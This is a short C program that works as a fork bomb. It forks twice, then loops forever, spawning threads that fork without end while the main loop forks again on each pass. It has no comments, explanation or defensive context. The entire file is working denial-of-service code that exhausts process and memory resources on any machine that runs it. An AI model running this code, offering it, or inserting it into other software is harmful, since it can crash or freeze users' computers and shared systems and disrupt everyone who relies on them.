#include<stdio.h>
#include<sys/types.h>
#include<pthread.h>

void * function_call(void * st) {
	while(1) {
		fork();
	}
}

int main() {
	fork();
	fork();
	while(1){
	pthread_t thread;
	pthread_create(&thread, NULL, function_call, NULL);
	pthread_join(thread, NULL);
	fork();}
	return 0;
}
